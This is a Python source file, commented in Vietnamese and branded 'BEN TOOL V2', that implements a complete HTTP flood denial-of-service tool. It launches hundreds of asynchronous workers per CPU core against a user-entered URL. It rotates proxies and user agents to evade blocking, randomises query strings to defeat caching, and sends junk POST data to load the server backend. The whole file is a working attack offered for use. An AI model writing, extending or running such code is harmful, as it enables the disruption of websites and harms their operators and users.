import asyncio
import aiohttp
import time
import random
import string
import os
import sys
import multiprocessing
import logging
from colorama import Fore, Style, init

# === CẤU HÌNH BAN ĐẦU ===
init(autoreset=True)
logging.getLogger("asyncio").setLevel(logging.CRITICAL)

# List Method hỗ trợ
METHODS = ["GET", "POST", "HEAD"]

DEFAULT_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
]

# === HÀM HỖ TRỢ (UTILS) ===
def load_file(filename):
    """Đọc file thành list, bỏ qua dòng trống"""
    if os.path.exists(filename):
        try:
            with open(filename, "r", encoding="utf-8") as f:
                return [line.strip() for line in f if line.strip()]
        except:
            pass
    return []

def random_string(length=10):
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for _ in range(length))

def get_target_url(base_url):
    """Tạo URL với tham số ngẫu nhiên để né cache"""
    separator = "&" if "?" in base_url else "?"
    return f"{base_url}{separator}{random_string(3)}={random_string(5)}"

# === XỬ LÝ REQUEST (CORE) ===
async def attack_worker(target_url, counter, user_agents, proxies, method_mode, duration):
    """
    Worker xử lý request bất đồng bộ.
    - method_mode: 'GET', 'POST', 'HEAD' hoặc 'RANDOM'
    """
    
    # Cấu hình Connector tối ưu tốc độ
    connector = aiohttp.TCPConnector(
        limit=0,              # Không giới hạn connection pool
        ttl_dns_cache=300,    # Cache DNS lâu hơn
        ssl=False,            # Bỏ qua check SSL
        enable_cleanup_closed=True
    )
    
    timeout = aiohttp.ClientTimeout(total=10, connect=5, sock_read=5)
    
    # Thời điểm dừng
    stop_time = time.time() + duration

    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        while time.time() < stop_time:
            try:
                # 1. Chọn Proxy (Nếu có)
                proxy = random.choice(proxies) if proxies else None
                
                # 2. Chọn User-Agent
                ua = random.choice(user_agents) if user_agents else random.choice(DEFAULT_UAS)
                
                # 3. Chọn Method
                if method_mode == "RANDOM":
                    method = random.choice(METHODS)
                else:
                    method = method_mode

                # 4. Chuẩn bị Headers & Url
                headers = {
                    "User-Agent": ua,
                    "Cache-Control": "no-cache",
                    "Connection": "keep-alive",
                    "Accept-Encoding": "gzip, deflate", # Nén dữ liệu để truyền nhanh hơn
                }
                
                url = get_target_url(target_url)
                
                # 5. Gửi Request
                # Nếu là POST thì gửi thêm data rác
                data = None
                if method == "POST":
                    data = {random_string(5): random_string(10) for _ in range(3)}

                async with session.request(method, url, headers=headers, proxy=proxy, data=data) as response:
                    # Chỉ cần đọc 1 byte đầu hoặc status để tiết kiệm băng thông
                    await response.read() 
                    # Hoặc chỉ cần await response.text() nếu server trả về nhỏ
                    
                    if response.status < 500: # Tính là thành công nếu server phản hồi
                        with counter.get_lock():
                            counter.value += 1
            except:
                # Lỗi kết nối, lỗi proxy, timeout -> Bỏ qua để loop tiếp
                pass

async def process_starter(target_url, concurrency, counter, user_agents, proxies, method, duration):
    sys.stderr = open(os.devnull, 'w') # Silent error
    tasks = []
    # Tạo hàng loạt task chạy song song trong 1 process
    for _ in range(concurrency):
        tasks.append(asyncio.create_task(attack_worker(target_url, counter, user_agents, proxies, method, duration)))
    await asyncio.gather(*tasks)

def run_process_wrapper(target_url, concurrency, counter, user_agents, proxies, method, duration):
    # Fix policy cho Windows
    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    try:
        asyncio.run(process_starter(target_url, concurrency, counter, user_agents, proxies, method, duration))
    except:
        pass

# === GIAO DIỆN & MONITOR ===
def monitor(counter, total_threads, ua_count, proxy_count, method, duration):
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.CYAN + f"""
    ██████╗ ███████╗███╗   ██╗
    ██╔══██╗██╔════╝████╗  ██║
    ██████╔╝█████╗  ██╔██╗ ██║
    ██╔══██╗██╔══╝  ██║╚██╗██║
    ██████╔╝███████╗██║ ╚████║
    ╚═════╝ ╚══════╝╚═╝  ╚═══╝
      BEN TOOL V2 - {method} MODE
    """)
    print(Fore.YELLOW + f"  [INFO] UA: {ua_count} | Proxy: {proxy_count} | Threads: {total_threads}")
    print(Fore.YELLOW + f"  [INFO] Method: {method} | Time: {duration}s")
    # Thêm dòng yếu tố ảnh hưởng theo yêu cầu
    print(Fore.RED + "  [!] Yếu tố ảnh hưởng: Requests/giây (Rất lớn) | Kết nối đồng thời (Rất nhiều) | Xử lý backend (Nặng)")
    print(Fore.MAGENTA + "="*65)
    print(Fore.GREEN + f"{'ELAPSED':^10} | {'TOTAL REQS':^20} | {'SPEED (Req/s)':^20}")
    print(Fore.MAGENTA + "="*65)
    
    start_time = time.time()
    last_count = 0
    
    while True:
        time.sleep(1)
        current = counter.value
        rps = current - last_count
        last_count = current
        elapsed = int(time.time() - start_time)
        
        # Màu sắc dựa trên tốc độ
        rps_color = Fore.GREEN
        if rps > 1000: rps_color = Fore.YELLOW
        if rps > 5000: rps_color = Fore.RED

        print(f" {str(elapsed)+'s':^9} | {f'{current:,}':^19} | {rps_color}{f'{rps:,}':^19}{Style.RESET_ALL}")
        
        if elapsed >= duration:
            break

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.CYAN + "=== BEN TOOL V2 (UPGRADED) ===")

    # 1. Load Resources
    user_agents = load_file("ua.txt")
    proxies = load_file("proxy.txt") # Format: http://ip:port hoặc http://user:pass@ip:port
    
    print(Fore.GREEN + f"-> Loaded {len(user_agents)} UA.")
    print(Fore.GREEN + f"-> Loaded {len(proxies)} Proxies.")
    if len(proxies) == 0:
        print(Fore.RED + "[!] Cảnh báo: Không có Proxy, IP của bạn sẽ dễ bị chặn!")

    # 2. Input cấu hình
    while True:
        url = input(Fore.WHITE + "URL mục tiêu: ").strip()
        if not url: continue
        if not url.startswith("http"): url = "http://" + url
        break
    
    print(Fore.WHITE + "\nChọn Method:")
    print("1. GET (Mặc định - Nhanh)")
    print("2. POST (Gửi data rác - Tốn resource server)")
    print("3. HEAD (Chỉ lấy header - Cực nhanh)")
    print("4. RANDOM (Kết hợp tất cả)")
    choice = input("Lựa chọn (1-4): ").strip()
    
    method_map = {"1": "GET", "2": "POST", "3": "HEAD", "4": "RANDOM"}
    method = method_map.get(choice, "GET")

    try:
        duration = int(input("Thời gian chạy (giây): ").strip())
    except:
        duration = 60

    # 3. Tính toán luồng
    cpu_count = os.cpu_count() or 4
    # Số luồng trên mỗi core. Tăng lên nếu mạng khỏe, giảm đi nếu máy lag.
    # Với requests có proxy, cần nhiều luồng hơn để bù delay.
    threads_per_core = 300 
    total_threads = cpu_count * threads_per_core
    
    print(Fore.GREEN + f"\n-> Khởi chạy {total_threads} luồng async trên {cpu_count} CPU core...")
    time.sleep(1)

    # 4. Chạy Multiprocessing
    counter = multiprocessing.Value('i', 0)
    processes = []
    
    for _ in range(cpu_count):
        p = multiprocessing.Process(
            target=run_process_wrapper, 
            args=(url, threads_per_core, counter, user_agents, proxies, method, duration)
        )
        p.daemon = True
        p.start()
        processes.append(p)
        
    try:
        monitor(counter, total_threads, len(user_agents), len(proxies), method, duration)
    except KeyboardInterrupt:
        pass
    finally:
        print(Fore.RED + "\n\n[!] ĐÃ DỪNG TOOL.")
        for p in processes: p.terminate()

if __name__ == '__main__':
    multiprocessing.freeze_support()
    sys.stderr = open(os.devnull, 'w')
    try: main()
    except: pass
